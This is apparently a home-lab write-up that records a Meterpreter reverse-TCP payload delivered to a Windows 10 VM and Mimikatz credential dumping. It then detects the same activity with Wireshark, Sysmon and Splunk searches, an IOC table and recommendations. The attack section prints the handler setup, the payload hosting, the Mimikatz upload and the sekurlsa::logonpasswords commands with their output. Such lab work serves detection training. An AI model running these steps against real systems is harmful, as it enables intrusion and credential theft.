# Basic Attack & Detection Lab: SOC Log Analysis, Malware Behavior & Incident Response

> Date and Timestamp's are old and new because it shown fix of old and new logs but process is same.


> **Lab classification:** Adversary simulation / malware-behavior analysis with SOC telemetry, Sysmon detection, Splunk threat hunting, and incident response.

This document is a full, detailed record of a lab exercise: delivering and executing a
stageless Meterpreter payload against a Windows 10 host, dumping credentials with
Mimikatz, and then hunting/detecting/killing the same activity using Sysmon (Event
Viewer) and Splunk. All command output below is reproduced exactly as captured in the
screenshots.

---

## 1. Home Lab Environment

I built this lab in my home environment using VMware to create an isolated setup for practicing attack and detection techniques.

The lab consists of three main systems: a **Kali Linux virtual machine acting as the Attacker**, a **Windows 10 virtual machine acting as the Victim/Target**, and **Splunk Server running on my Host Machine** for centralized log collection and SOC investigation.

The main setup was:

- **Attacker — Kali Linux VM** — used for attack simulation, payload delivery, and Meterpreter activity.
- **Victim/Target — Windows 10 VM** — used as the target system where the payload was downloaded and executed.
- **SOC/Detection — Splunk Server on the Host Machine** — used for centralized log collection, searching, threat hunting, and investigation.
- **Wireshark** — used to inspect network traffic and identify suspicious TCP/HTTP communication.
- **Sysmon** — used on Windows to generate detailed endpoint telemetry for detection and investigation.

I used this setup to follow the activity from the initial network connection and file download through execution, post-exploitation activity, detection in Sysmon, and finally investigation and hunting in Splunk.

## 1.1. Environment Summary

| Role | Host | OS / Tooling |
|---|---|---|
| Attacker | Kali Linux | `192.168.133.142` — Python3 `http.server`, Metasploit Framework `v6.5.3-dev` |
| Victim | `DESKTOP-BP3ESIC` | `192.168.133.136` — Windows 10 Pro, Build 19045, VMware Virtual Platform, user `username`, WORKGROUP |
| Payload | `stageless.exe` | Windows x64 Meterpreter reverse-TCP stageless payload |
| C2 Port | `4444` | `windows/x64/meterpreter_reverse_tcp` |
| Delivery Port | `8080` | Python `http.server` |
| Detection Tooling | Sysmon on Windows 10 + Splunk Server on Host Machine (Universal Forwarder → `index=main`) | |

---

## 2. Adversary Simulation & Attack Execution

### 2.1 Hosting the Payload

I first prepared the payload on the Kali machine and used a simple Python HTTP server to make it available to the Windows host. The HTTP log shows the victim connecting to the server and requesting `stageless.exe`, confirming that the file was successfully delivered over the network.

```
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.133.136 - - [24/Sep/2026 09:20:30] "GET / HTTP/1.1" 200 -
192.168.133.136 - - [24/Sep/2026 09:20:30] code 404, message File not found
192.168.133.136 - - [24/Sep/2026 09:20:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.133.136 - - [24/Sep/2026 09:20:37] "GET /stageless.exe HTTP/1.1" 304 -
192.168.133.136 - - [24/Sep/2026 09:21:17] "GET / HTTP/1.1" 200 -
192.168.133.136 - - [24/Sep/2026 09:21:17] code 404, message File not found
192.168.133.136 - - [24/Sep/2026 09:21:17] "GET /favicon.ico HTTP/1.1" 404 -
```

### 2.2 Metasploit Handler & Initial Access

After the file was delivered, I started the Metasploit handler and waited for the Windows system to connect back. The reverse TCP connection was established from the victim to Kali on port `4444`, which gave me the Meterpreter session used for the rest of the attack simulation.

```
$ msfconsole
Metasploit tip: Use the capture plugin to start multiple
authentication-capturing and poisoning services

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.133.142
LHOST => 192.168.133.142
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.133.142:4444
[*] Meterpreter session 1 opened (192.168.133.142:4444 -> 192.168.133.136:49867) at 2026-09-24 09:22:22 -0400
```

### 2.3 Uploading Mimikatz & Dumping Credentials

Once the Meterpreter session was available, I uploaded Mimikatz to the Windows host and used the Kiwi extension to test credential-access activity. The output showed the `username` account and its NTLM/SHA1 values, while the WDigest and Kerberos password fields were empty.

```
meterpreter > upload  /home/kali/Downloads/mimikatz.exe C:\\Users\\Public
[*] Uploading  : /home/kali/Downloads/mimikatz.exe -> C:\Users\Public\mimikatz.exe
[*] Completed  : /home/kali/Downloads/mimikatz.exe -> C:\Users\Public\mimikatz.exe

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com  ***/
Success.

meterpreter > kiwi_cmd privilege::debug
Privilege '20' OK

meterpreter > kiwi_cmd sekurlsa::logonpasswords

Authentication Id : 0 ; 206043 (00000000:000324db)
Session           : Interactive from 1
User Name         : username
Domain            : DESKTOP-BP3ESIC
Logon Server      : DESKTOP-BP3ESIC
Logon Time        : 9/24/2026 6:42:32 PM
SID               : S-1-5-21-2357029914-1615271370-2066435090-1000
        msv :
         [00000003] Primary
         * Username : username
         * Domain   : DESKTOP-BP3ESIC
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : username
         * Domain   : DESKTOP-BP3ESIC
         * Password : (null)
        kerberos :
         * Username : username
         * Domain   : DESKTOP-BP3ESIC
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 205837 (00000000:0003240d)
Session           : Interactive from 1
User Name         : username
Domain            : DESKTOP-BP3ESIC
[... same msv/wdigest/kerberos/ssp/credman/cloudap layout, all NTLM/SHA1 identical to above ...]

Authentication Id : 0 ; 150324 (00000000:00024b34)
Session           : Service from 0
User Name         : SplunkForwarder
Domain            : NT SERVICE
SID               : S-1-5-80-972488765-139171986-783781252-3188962990-3730692313
        wdigest :
         * Username : DESKTOP-BP3ESIC$
         * Domain   : WORKGROUP
         * Password : (null)

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
SID               : S-1-5-19

Authentication Id : 0 ; 76896 (00000000:00012c60)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
SID               : S-1-5-90-0-1
        wdigest :
         * Username : DESKTOP-BP3ESIC$

Authentication Id : 0 ; 76851 (00000000:00012c33)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
SID               : S-1-5-90-0-1

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-BP3ESIC$
Domain            : WORKGROUP
SID               : S-1-5-20
        kerberos :
         * Username : desktop-bp3esic$
         * Domain   : WORKGROUP

Authentication Id : 0 ; 53781 (00000000:0000d215)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
SID               : S-1-5-96-0-1
```

> **Note:** All logon-password values recovered were empty/null (`wdigest`/`kerberos`
> password fields = `(null)`), and the only non-null secret exposed was the local user
> `username`'s NTLM hash (`31d6cfe0d16ae931b73c59d7e0c089c0`) and SHA1
> (`da39a3ee5e6b4b0d3255bfef95601890afd80709`). This is expected on a patched build with
> WDigest disabled.

### 2.4 Post-Exploitation Recon & Session Re-establishment (via `meterpreter > shell`)

After gaining access, I moved into a Windows shell and collected basic host information such as the OS version, hostname, network configuration, running processes, and current user. Then i verified the session by checking the current user and IP configuration again.

```
meterpreter > shell
Process 6220 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Users\username\Downloads>systeminfo
systeminfo

Host Name:                 DESKTOP-BP3ESIC
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:              Multiprocessor Free
Registered Owner:          Windows User
Product ID:                00330-80000-00000-AA811
Original Install Date:     9/24/2026, 10:03:44 AM
System Boot Time:          9/24/2026, 6:42:17 PM
System Manufacturer:       VMware, Inc.
System Model:               VMware Virtual Platform
System Type:                x64-based PC
Processor(s):               2 Processor(s) Installed.
                             [01]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3294 Mhz
                             [02]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3294 Mhz
BIOS Version:               Phoenix Technologies LTD 6.00, 3/24/2025
Total Physical Memory:      2,047 MB
Available Physical Memory:  1,047 MB
Domain:                     WORKGROUP
Logon Server:                \\DESKTOP-BP3ESIC
Hotfix(s):                  5 Hotfix(s) Installed.
                             [01]: KB5022502
                             [02]: KB5015684
                             [03]: KB5026361
                             [04]: KB5014032
                             [05]: KB5025315
Network Card(s):            1 NIC(s) Installed.
                             [01]: Intel(R) 82574L Gigabit Network Connection
                                   Connection Name: Ethernet0
                                   DHCP Enabled:    Yes
                                   DHCP Server:     192.168.133.254
                                   IP address(es)
                                   [01]: 192.168.133.136
                                   [02]: fe80::630:5cdf:25a9:1850

C:\Users\username\Downloads>whoami
whoami
desktop-bp3esic\username

C:\Users\username\Downloads>tasklist | find "stageless.exe"
tasklist | find "stageless.exe"
stageless.exe                 1880 Console                    1    2,928 K

C:\Users\username\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4E57-0630

 Directory of C:\Users\username\Downloads

09/24/2026  06:51 PM    <DIR>          .
09/24/2026  06:51 PM    <DIR>          ..
09/24/2026  10:07 AM           761,964 MAS_AIO.cmd
09/24/2026  10:21 AM       159,436,800 splunkforwarder-10.4.3-4174a2deda5d-windows-x64.msi
09/24/2026  06:51 PM           262,656 stageless.exe
09/24/2026  11:41 AM        97,931,232 Wireshark-4.6.9-x64.exe
               4 File(s)    258,392,652 bytes
               2 Dir(s)  42,022,502,400 bytes free

C:\Users\username\Downloads>
[*] 192.168.133.136 - Meterpreter session 1 closed.  Reason: Died
```


The first session eventually died, so I re-ran the handler and established a second Meterpreter callback. I verified the new session by opening a Windows shell and checking `whoami` and `ipconfig`, confirming that access to the same Windows host had been re-established.

```text
meterpreter > shell
Process 7364 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Users\username\Downloads>whoami
whoami
desktop-bp3esic\username

C:\Users\username\Downloads>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::630:5cdf:25a9:1850%9
   IPv4 Address. . . . . . . . . . . : 192.168.133.136
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.133.2

C:\Users\username\Downloads>
```
---

## 3. SOC Detection, Threat Hunting & Response

### 3.1 Network Capture (Wireshark — `payload.pcapng`, `tcp.stream eq 24`)

I first used Wireshark to investigate the unknown network activity by following the TCP and HTTP traffic. I identified the connection between the Windows host and the Kali system, then followed the HTTP stream and found the request for `stageless.exe`. The TCP handshake and HTTP `200 OK` response showed that the connection was successfully established and the file was served to the Windows Target.

**Request (frame 1779):**

```
GET / HTTP/1.1
Host: 192.168.133.142:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

**Response (frame 1844):**

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.7
Date: Thu, 24 Sep 2026 13:20:30 GMT
Content-type: text/html; charset=utf-8
Content-Length: 1765
```

- TCP stream index: **24**
- Client: `192.168.133.136:49829` → Server: `192.168.133.142:8080`
- Full TCP handshake, HTTP GET/200 OK, then clean FIN/ACK teardown (frames 1775–1847).
- This confirms the victim's browser (Edge/Chrome UA string) pulled the payload page
  from the attacker's Python server, consistent with the drive-by download later flagged
  by Sysmon Event ID 15 (Zone.Identifier / Mark-of-the-Web).

---

### 3.2 Detection Phase — Sysmon (Event Viewer, `Microsoft-Windows-Sysmon/Operational`)

After confirming the network activity in Wireshark, I moved to the Windows Sysmon logs to see how the same activity appeared from the endpoint. I used the events to follow the downloaded file from delivery to execution, network communication, tool creation, and process termination.

#### 3.2.1 Delivery — Mark of the Web (Event ID 15, `FileCreate`/`FileCreateStreamHash`)

I first checked how Windows recorded the downloaded file. Sysmon Event ID 15 showed that Edge created a Zone.Identifier stream for `stageless.exe`, linking the file back to the HTTP server used for delivery.

Microsoft Edge tagged the downloaded file with a Zone.Identifier Alternate Data Stream,
proving the file was downloaded from the internet zone:

```
File stream created:
RuleName: -
UtcTime: 2026-09-24 13:21:20.472
ProcessGuid: {6741e0dc-23d5-6ab5-8e01-000000000900}
ProcessId: 1812
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TargetFilename: C:\Users\username\Downloads\stageless.exe:Zone.Identifier
CreationUtcTime: 2026-09-24 13:21:20.472
Hash: MD5=159C042FB623521A77C2C16CCC524DD8,SHA256=DB33E46C6ADFC98F5D834F727C087E112BBFA9CBAA805458D127387BE01E97,IMPHASH=00000000000000000000000000000000
Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://192.168.133.142:8080/ HostUrl=http://192.168.133.142:8080/stageless.exe
User: DESKTOP-BP3ESIC\username
```

- **`ZoneId=3`** = Internet zone.
- **`HostUrl`** = `http://192.168.133.142:8080/stageless.exe` — direct match to the
  attacker's Python HTTP server in §2.1.
- **File hashes** (usable as a static IOC):
  - MD5: `159C042FB623521A77C2C16CCC524DD8`
  - SHA256: `DB33E46C6ADFC98F5D834F727C087E112BBFA9CBAA805458D127387BE01E97`

#### 3.2.2 Execution — Process Creation Tree (Event ID 1, `ProcessCreate`)

Next, I checked process-creation events to understand what happened after the file was opened. The Sysmon process tree showed `explorer.exe` starting `stageless.exe`, followed by `cmd.exe` and the reconnaissance commands launched from the Meterpreter shell.

Reconstructed parent → child chain across both sessions:

```
explorer.exe (PID 4232)
 └─ stageless.exe (PID 1880)         UtcTime 2026-09-24 13:22:20.879
     └─ cmd.exe (PID 6220)           UtcTime 2026-09-24 13:23:03.732
         ├─ systeminfo.exe (PID 836)  UtcTime 2026-09-24 13:23:10.250
         ├─ whoami.exe (PID 2168)     UtcTime 2026-09-24 13:23:15.523
         └─ taskkill.exe (PID 5824)   UtcTime 2026-09-24 13:23:37.304
```

Key raw event (stageless.exe spawning cmd.exe):

```
Process Create:
RuleName: -
UtcTime: 2026-09-24 13:23:03.732
ProcessGuid: {6741e0dc-240c-6ab5-9e01-000000000900}
ProcessId: 6220
Image: C:\Windows\System32\cmd.exe
CommandLine: "C:\Windows\system32\cmd.exe"
CurrentDirectory: C:\Users\username\Downloads\
User: DESKTOP-BP3ESIC\username
ParentProcessGuid: {6741e0dc-23c0-6ab5-9e01-000000000900}
ParentProcessId: 1880
ParentImage: C:\Users\username\Downloads\stageless.exe
ParentCommandLine: "C:\Users\username\Downloads\stageless.exe"
```

`stageless.exe` itself being launched from Explorer (i.e., the user double-clicked the
downloaded file):

```
Process Create:
UtcTime: 2026-09-24 13:22:20.879
ProcessId: 1880
Image: C:\Users\username\Downloads\stageless.exe
CommandLine: "C:\Users\username\Downloads\stageless.exe"
ParentImage: C:\Windows\explorer.exe
ParentProcessId: 4232
User: DESKTOP-BP3ESIC\username
```

#### 3.2.3 C2 Callback — Network Connection & DNS Query (Event ID 3 / 22)

I then checked Sysmon network and DNS events to confirm the callback seen earlier in Wireshark. The logs showed `stageless.exe` resolving the Kali address and making an outbound TCP connection to port `4444`, matching the Meterpreter handler.

```
Dns query:
RuleName: -
UtcTime: 2026-09-24 13:22:20.993
ProcessGuid: {6741e0dc-240c-6ab5-9e01-000000000900}
ProcessId: 1880
QueryName: 192.168.133.142
QueryStatus: 0
QueryResults: 192.168.133.142;
Image: C:\Users\username\Downloads\stageless.exe
User: DESKTOP-BP3ESIC\username
```

```
Network connection detected:
RuleName: Usermode
UtcTime: 2026-09-24 13:22:21.000
ProcessGuid: {6741e0dc-240c-6ab5-9e01-000000000900}
ProcessId: 1880
Image: C:\Users\username\Downloads\stageless.exe
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.133.136
SourceHostname: DESKTOP-BP3ESIC.localdomain
SourcePort: 49867
DestinationIsIpv6: false
DestinationIp: 192.168.133.142
DestinationPort: 4444
```

- Confirms the exact reverse-TCP callback from §2.2 (`49867 → 4444`).

#### 3.2.4 VirusTotal Verification

After confirming the network connection in Sysmon, I checked the `stageless.exe` file on VirusTotal to see whether security vendors had already identified it as malicious. The scan showed **45 out of 71 security vendors** flagging the file, with detections including Meterpreter, trojan, beacon, and credential-dumping related classifications. This gave me another piece of evidence that the file was malicious.

The VirusTotal result showed:

- **Detection:** 45 / 71 security vendors
- **File:** `stageless.exe`
- **Size:** 256.50 KB
- **File type:** Windows executable (EXE)
- **Community score:** 5
- **Observed labels:** Meterpreter, Trojan, Beacon, Dump, and related malicious classifications

I used this result as an additional verification point alongside the Wireshark traffic and Sysmon events before continuing with the endpoint investigation.

#### 3.2.5 Credential Dumping Artifact — Dropped Mimikatz Binary (Event ID 11, `FileCreate`)

To identify evidence of the credential-access activity, I searched for file-creation events. Sysmon recorded `stageless.exe` writing `mimikatz.exe` into `C:\Users\Public`, providing a clear endpoint artifact connecting the payload to the credential-dumping activity.

```
File created:
RuleName: EXE
UtcTime: 2026-09-24 13:22:38.135
ProcessGuid: {6741e0dc-240c-6ab5-9e01-000000000900}
ProcessId: 1880
Image: C:\Users\username\Downloads\stageless.exe
TargetFilename: C:\Users\Public\mimikatz.exe
CreationUtcTime: 2026-09-24 06:22:29.926
User: DESKTOP-BP3ESIC\username
```

- `stageless.exe` (the Meterpreter process) is directly recorded as the writer of
  `C:\Users\Public\mimikatz.exe` — this is the strongest single artifact tying the
  credential-dumping activity to the malicious process.


---

### 3.3 Hunting Phase — Splunk (`index=main`, `sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"`, `host=DESKTOP-BP3ESIC`)

After collecting the endpoint evidence, I moved the investigation into Splunk. The goal was to correlate the individual Sysmon events and confirm the full sequence of activity instead of relying on a single alert.

#### 3.3.1 Full activity timeline for the payload

I started with a broad Splunk search for events related to `stageless.exe`. This helped me reconstruct when the payload executed, connected to the Kali host, created the secondary tool, spawned a shell, and terminated.

```spl
index=main host=DESKTOP-BP3ESIC sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(Image="*stageless.exe*" OR ParentImage="*stageless.exe*")
| table _time, EventCode, Image, ParentImage, CommandLine, User
| sort _time
```

**Result — 15 events, 9/23–9/24/2026:**

```
_time                     EventCode  Image                                    ParentImage           CommandLine                                User
2026-09-24 11:51:39.834   22         C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 11:51:39.895   3          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 11:52:29.929   11         C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 12:26:13.486   5          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 18:52:20.880   1          C:\Users\username\Downloads\stageless.exe  C:\Windows\explorer.exe  "C:\Users\username\Downloads\stageless.exe"     DESKTOP-BP3ESIC\username
2026-09-24 18:52:23.008   22         C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 18:52:23.030   3          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 18:52:38.140   11         C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 18:53:03.734   1          C:\Windows\System32\cmd.exe             C:\Users\username\Downloads\stageless.exe  C:\Windows\system32\cmd.exe   DESKTOP-BP3ESIC\username
2026-09-24 18:55:06.254   5          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 19:00:39.087   1          C:\Users\username\Downloads\stageless.exe  C:\Windows\explorer.exe  "C:\Users\username\Downloads\stageless.exe"     DESKTOP-BP3ESIC\username
2026-09-24 19:00:41.027   3          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 19:00:41.153   22         C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
2026-09-24 19:00:49.566   1          C:\Windows\System32\cmd.exe             C:\Users\username\Downloads\stageless.exe  C:\Windows\system32\cmd.exe   DESKTOP-BP3ESIC\username
2026-09-24 19:20:08.420   5          C:\Users\username\Downloads\stageless.exe                                                                       DESKTOP-BP3ESIC\username
```

This single search shows **three distinct execution cycles** of `stageless.exe`
(≈11:51, ≈18:52, ≈19:00), each following the identical pattern:
`DNS query (22) → Network connect (3) → drop mimikatz (11) → [spawn cmd.exe (1)] → terminate (5)`.

#### 3.3.2 Confirming the Mimikatz drop

I then narrowed the search to Event ID 11 and `mimikatz.exe`. This confirmed that the credential-dumping tool was created by the `stageless.exe` process on the Windows host.

```spl
index=main host=DESKTOP-BP3ESIC sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=11 TargetFilename="*mimikatz.exe*"
| table _time, Image, TargetFilename, CreationUtcTime, User
```

**Result — 2 events:**

```
_time                     Image                                    TargetFilename                  CreationUtcTime            User
2026-09-24 18:52:38.140   C:\Users\username\Downloads\stageless.exe   C:\Users\Public\mimikatz.exe     2026-09-24 06:22:29.926   DESKTOP-BP3ESIC\username
2026-09-24 11:52:29.929   C:\Users\username\Downloads\stageless.exe   C:\Users\Public\mimikatz.exe     2026-09-24 06:22:29.926   DESKTOP-BP3ESIC\username
```

#### 3.3.3 Confirming C2 beaconing to the attacker

Next, I searched for outbound connections to the Kali IP on port `4444`. The results matched the Meterpreter callback observed earlier, confirming the C2 communication from the Windows host.

```spl
index=main host=DESKTOP-BP3ESIC sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=3 DestinationIp="192.168.133.142" DestinationPort=4444
| table _time, Image, SourceIp, DestinationIp, DestinationPort, User
```

**Result — 3 events:**

```
_time                     Image                                    SourceIp         DestinationIp     DestinationPort   User
2026-09-24 11:51:39.895   C:\Users\username\Downloads\stageless.exe   192.168.133.136  192.168.133.142   4444              DESKTOP-BP3ESIC\username
2026-09-24 18:52:23.030   C:\Users\username\Downloads\stageless.exe   192.168.133.136  192.168.133.142   4444              DESKTOP-BP3ESIC\username
2026-09-24 19:00:41.027   C:\Users\username\Downloads\stageless.exe   192.168.133.136  192.168.133.142   4444              DESKTOP-BP3ESIC\username
```

#### 3.3.4 Confirming process termination / kill events

Finally, I searched for Sysmon Event ID 5 to confirm when the malicious process stopped. The results showed the termination of the same `stageless.exe` processes identified during the earlier investigation.

```spl
index=main host=DESKTOP-BP3ESIC sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=5 Image="*stageless.exe*"
| table _time, Image, ProcessId, User
```

**Result — 3 events:**

```
_time                     Image                                    ProcessId   User
2026-09-24 12:26:13.486   C:\Users\username\Downloads\stageless.exe   7716        DESKTOP-BP3ESIC\username
2026-09-24 19:20:08.420   C:\Users\username\Downloads\stageless.exe   3836        DESKTOP-BP3ESIC\username
2026-09-24 18:55:06.254   C:\Users\username\Downloads\stageless.exe   1880        DESKTOP-BP3ESIC\username
```

Each `ProcessId` here maps 1:1 to a `ProcessCreate` (Event 1) earlier in the same
session, confirming three complete process lifecycles (spawn → beacon → drop tool → die/killed).

---

### Manual Response After Splunk Investigation

After using Splunk to confirm the process activity, C2 connections, and termination events, I performed the containment step on the Windows victim by locating `stageless.exe` and terminating it with `taskkill`. This connected the SOC investigation with a practical endpoint response action.

#### 3.3.5 Manual Response — Killing the Process (Administrator Command Prompt)

After identifying the malicious process, I tested a basic containment response by locating `stageless.exe` and terminating it with `taskkill`. Sysmon then recorded the process termination, allowing the response action to be verified in the logs.

```
C:\Windows\system32>tasklist | find "mimikatz.exe" "stageless.exe"
File not found - STAGELESS.EXE

C:\Windows\system32>tasklist | find "stageless.exe"
stageless.exe                 3836 Console                    1        596 K

C:\Windows\system32>tasklist | find "mimikatz.exe"

C:\Windows\system32>taskkill /F stageless.exe
ERROR: Invalid argument/option - 'stageless.exe'.
Type "TASKKILL /?" for usage.

C:\Windows\system32>taskkill /F /IM stageless.exe
SUCCESS: The process "stageless.exe" with PID 3836 has been terminated.

C:\Windows\system32>tasklist | find "mimitakz.exe"

C:\Windows\system32>
```

- Note the first `taskkill /F stageless.exe` attempt failed because the `/IM` switch
  was omitted — corrected on the next line with `taskkill /F /IM stageless.exe`.

Corresponding Sysmon audit trail for the kill:

```
Process Create (taskkill.exe):
UtcTime: 2026-09-24 13:23:37.304
ProcessGuid: {6741e0dc-2459-6ab5-b601-000000000900}
ProcessId: 5824
Image: C:\Windows\System32\taskkill.exe
CommandLine: taskkill
User: DESKTOP-BP3ESIC\username
ParentProcessGuid: {6741e0dc-2437-6ab5-ab01-000000000900}
ParentProcessId: 6220
ParentImage: C:\Windows\System32\cmd.exe
```

```
Process terminated:
RuleName: -
UtcTime: 2026-09-24 13:50:08.417
ProcessGuid: {6741e0dc-25ff-6ab5-0b02-000000000900}
ProcessId: 3836
Image: C:\Users\username\Downloads\stageless.exe
User: DESKTOP-BP3ESIC\username
```

### 4 Indicators of Compromise (IOC) Summary

I collected the main indicators from the investigation so they could be used for future searches or detection rules. These include the payload name and hashes, delivery URL, C2 address and port, dropped Mimikatz file, and affected host information.

| Type | Value |
|---|---|
| Malicious file | `stageless.exe` |
| Drop path | `C:\Users\username\Downloads\stageless.exe` |
| MD5 | `159C042FB623521A77C2C16CCC524DD8` |
| SHA256 | `DB33E46C6ADFC98F5D834F727C087E112BBFA9CBAA805458D127387BE01E97` |
| Delivery URL | `http://192.168.133.142:8080/stageless.exe` |
| Delivery server banner | `SimpleHTTP/0.6 Python/3.14.7` |
| C2 IP : Port | `192.168.133.142 : 4444` |
| Dropped tool | `C:\Users\Public\mimikatz.exe` |
| Victim host | `DESKTOP-BP3ESIC` (`192.168.133.136`) |
| Victim user | `username` |
| Compromised NTLM hash | `31d6cfe0d16ae931b73c59d7e0c089c0` |
| Compromised SHA1 | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |

---

### 5 Consolidated Timeline

I connected the attack-side activity with the detection-side evidence so the timeline shows what happened first and how the same activity appeared in Wireshark, Sysmon, VirusTotal, and Splunk. The Metasploit timestamps shown with `-0400` are aligned with the Sysmon UTC timestamps below.

| Time | Attack Activity | Detection / Evidence |
|---|---|---|
| 13:20:30 UTC | The Windows 10 victim requested the attacker's web server over HTTP. | Kali `http.server` recorded the request from `192.168.133.136`. |
| 13:20:37 UTC | The victim requested `stageless.exe` from the Kali server. | Kali HTTP log recorded `GET /stageless.exe`. |
| 13:21:20 UTC | The downloaded file was present on the Windows system. | **Sysmon Event ID 15** recorded the Zone.Identifier and confirmed the file came from the attacker's HTTP server. |
| 13:22:20 UTC | The victim executed `stageless.exe`. | **Sysmon Event ID 1** showed `explorer.exe → stageless.exe`. |
| 13:22:20–21 UTC | `stageless.exe` started the reverse connection to Kali. | **Sysmon Event ID 22/3** recorded the DNS query and TCP connection to `192.168.133.142:4444`. |
| 13:22:38 UTC | The Meterpreter session was used to place `mimikatz.exe` on the victim. | **Sysmon Event ID 11** recorded `stageless.exe` creating `C:\Users\Public\mimikatz.exe`. |
| 13:22–23 UTC | Credential-dumping activity was performed with Kiwi/Mimikatz. | Meterpreter output showed `sekurlsa::logonpasswords`; the activity was later visible through the endpoint logs. |
| 13:23:03 UTC | The attacker opened a Windows shell and performed basic host reconnaissance. | **Sysmon Event ID 1** showed `stageless.exe → cmd.exe`, followed by `systeminfo`, `whoami`, and other commands. |
| 13:23:37 UTC | A process-kill command was attempted during the investigation/response activity. | **Sysmon Event ID 1** recorded `taskkill.exe` being created by `cmd.exe`. |
| 13:30:40 UTC | The Meterpreter handler was started again and a second session was established. | Metasploit recorded session 2 connecting from the Windows victim to Kali on port `4444`. |
| 13:50:08 UTC | The malicious process was terminated. | **Sysmon Event ID 5** recorded `stageless.exe` termination, providing the endpoint evidence of process shutdown. |
| Later cycles | `stageless.exe` appeared again during additional lab testing. | **Splunk** correlated repeated DNS, network connection, file creation, process creation, and termination events. |

This correlation shows the complete flow: **HTTP delivery → file download → execution → C2 connection → Mimikatz drop → credential-dumping activity → reconnaissance → detection in Sysmon → Splunk investigation → process termination**.

---

---

### 6 Detection & Response Recommendations

Based on the activity observed during the lab, I noted several practical detection and response ideas. These focus on the network connection, downloaded executable, suspicious file creation, process behavior, and Splunk correlation opportunities.

1. **Block/alert on outbound connections to port 4444** from workstation subnets —
   this is Metasploit's classic default `LPORT` and stood out clearly in Sysmon Event ID 3.
2. **Alert on any process under `\Downloads\` writing an executable to
   `C:\Users\Public\`** (Sysmon Event 11) — a strong, low-noise indicator of a dropper
   staging a secondary tool (here, Mimikatz).
3. **Hash-match** `stageless.exe`'s SHA256/MD5 (§6) in EDR/AV and threat-intel feeds.
4. **Application allow-listing / Attack Surface Reduction rules** to block execution of
   unsigned binaries launched directly from `Downloads` with Zone.Identifier = 3
   (Internet zone), leveraging the Event ID 15 Mark-of-the-Web data.
5. **Credential hygiene:** disable WDigest (already appears disabled here — passwords
   were `null`), enable Credential Guard, and rotate the local `username` account
